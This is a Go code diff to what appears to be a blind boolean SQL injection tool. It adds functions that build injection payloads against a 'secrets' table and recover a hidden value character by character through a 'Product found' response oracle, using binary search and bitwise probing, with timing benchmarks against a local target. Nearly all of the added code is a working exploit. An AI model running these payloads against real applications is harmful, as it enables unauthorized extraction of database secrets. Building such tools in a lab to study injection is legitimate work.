@@ -88,7 +88,7 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 
 	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
 	if err != nil {
-		return Observation{}, fmt.Errorf("send request %w", err)
+		return Observation{}, fmt.Errorf("create new request %w", err)
 	}
 
 	resp, err := c.Client.Do(req)
@@ -97,7 +97,7 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 		if errors.As(err, &netErr) && netErr.Timeout() {
 			return Observation{}, fmt.Errorf("request timeout %w", err)
 		}
-		return Observation{}, fmt.Errorf("create new request %w", err)
+		return Observation{}, fmt.Errorf("send request %w", err)
 	}
 
 	defer resp.Body.Close()
@@ -105,7 +105,7 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 	limitedReader := io.LimitReader(resp.Body, 1024*1024)
 	res, err := io.ReadAll(limitedReader)
 	if err != nil {
-		return Observation{}, fmt.Errorf("read resp erro %w", err)
+		return Observation{}, fmt.Errorf("read response body: %w", err)
 	}
 
 	elapsed := time.Since(startTime)
@@ -233,6 +233,116 @@ func (c *HTTPClient) ExtractByASCII(maxLen int, minCode int, maxCode int) (strin
 	return result.String(), nil
 }
 
+func buildASCIIGreaterPayload(position int, code int) string {
+	return fmt.Sprintf(
+		"1' AND unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1))>%d-- -",
+		position,
+		code,
+	)
+}
+
+func (c *HTTPClient) ExtractViaBinarySearch(maxLen int, minCode int, maxCode int) (string, error) {
+	if maxLen <= 0 {
+		return "", errors.New("maxLen must be positive")
+	}
+
+	if minCode <= 0 {
+		return "", errors.New("minCode must be positive")
+	}
+
+	if maxCode <= 0 {
+		return "", errors.New("maxCode must be positive")
+	}
+
+	if minCode > maxCode {
+		return "", errors.New("minCode cannot be greater than maxCode")
+	}
+
+	var result strings.Builder
+
+	for i := 1; i <= maxLen; i++ {
+		low := minCode
+		high := maxCode
+		for low < high {
+			mid := (low + high) / 2
+			payload := buildASCIIGreaterPayload(i, mid)
+
+			obs, err := c.SendPayload(payload)
+			if err != nil {
+				return "", fmt.Errorf("send payload at position %d code %d: %w", i, mid, err)
+			}
+
+			ok := bodyContainsOracle(obs, "Product found")
+			if ok {
+				low = mid + 1
+			} else {
+				high = mid
+			}
+		}
+		result.WriteRune(rune(low))
+		fmt.Println("[+] Current result:", result.String())
+	}
+
+	return result.String(), nil
+}
+
+func buildASCIIBitwisePayload(position int, mask int) string {
+	return fmt.Sprintf(
+		"1' AND (unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1)) & %d)>0-- -",
+		position,
+		mask,
+	)
+}
+
+func (c *HTTPClient) ExtractViaBitwise(maxLen int, minCode int, maxCode int) (string, error) {
+	if maxLen <= 0 {
+		return "", errors.New("maxLen must be positive")
+	}
+
+	if minCode <= 0 {
+		return "", errors.New("minCode must be positive")
+	}
+
+	if maxCode <= 0 {
+		return "", errors.New("maxCode must be positive")
+	}
+
+	if minCode > maxCode {
+		return "", errors.New("minCode cannot be greater than maxCode")
+	}
+
+	var result strings.Builder
+	masks := []int{
+		1, 2, 4, 8, 16, 32, 64,
+	}
+
+	for i := 1; i <= maxLen; i++ {
+		code := 0
+
+		for _, mask := range masks {
+			payload := buildASCIIBitwisePayload(i, mask)
+			obs, err := c.SendPayload(payload)
+			if err != nil {
+				return "", fmt.Errorf("send payload at position %d code %d: %w", i, mask, err)
+			}
+
+			ok := bodyContainsOracle(obs, "Product found")
+			if ok {
+				code |= mask
+			}
+		}
+
+		if code < minCode || code > maxCode {
+			break
+		}
+
+		result.WriteRune(rune(code))
+		fmt.Println("[+] Current result:", result.String())
+	}
+
+	return result.String(), nil
+}
+
 func main() {
 	client, err := NewHTTPClient("http://127.0.0.1:5003/boolean", 5*time.Second)
 	if err != nil {
@@ -259,19 +369,48 @@ func main() {
 		fmt.Println()
 	}
 
+	timeStartCharset := time.Now()
 	charsetSecret, err := client.ExtractByCharset(21, DefaultCharset)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
+	elapsedCharset := time.Since(timeStartCharset)
 
 	fmt.Println("Charset extracted secret:", charsetSecret)
 
+	timeStartAscii := time.Now()
 	asciiSecret, err := client.ExtractByASCII(21, ASCIIMin, ASCIIMax)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
+	elapsedAscii := time.Since(timeStartAscii)
 
 	fmt.Println("ASCII extracted secret:", asciiSecret)
+
+	timeStartBinary := time.Now()
+	binarySecret, err := client.ExtractViaBinarySearch(21, ASCIIMin, ASCIIMax)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	elapsedBinary := time.Since(timeStartBinary)
+	fmt.Println("ASCII binary search extracted secret:", binarySecret)
+
+	timeStartBitwise := time.Now()
+	bitwiseSecret, err := client.ExtractViaBitwise(21, ASCIIMin, ASCIIMax)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	elapsedBitwise := time.Since(timeStartBitwise)
+	fmt.Println("Bitwise search extracted secret:", bitwiseSecret)
+
+	fmt.Println()
+
+	fmt.Println("Benchmark for charset extracting:", elapsedCharset)
+	fmt.Println("Benchmark for ascii extracting:", elapsedAscii)
+	fmt.Println("Benchmark for binary extracting:", elapsedBinary)
+	fmt.Println("Benchmark for Bitwise extracting:", elapsedBitwise)
 }
